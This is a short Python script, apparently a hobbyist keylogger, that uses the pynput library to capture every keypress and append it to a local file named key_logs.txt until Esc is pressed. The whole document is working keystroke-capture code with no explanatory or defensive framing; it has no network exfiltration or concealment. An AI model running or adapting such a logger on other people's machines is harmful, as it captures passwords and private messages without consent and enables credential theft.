import pynput
from pynput.keyboard import Key, Listener

count = 0


def press(key):
    global count
    count += 1

    if count >= 1:
        count = 0
        write_file(str(key))


def write_file(key):
    with open("key_logs.txt", "a") as file:
        print(key)
        k = str(key).replace("'", "")
        if k.find("space") >= 0:
            file.write("\n")
        elif k.find("Key") == -1:
            file.write(str(k))


def release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()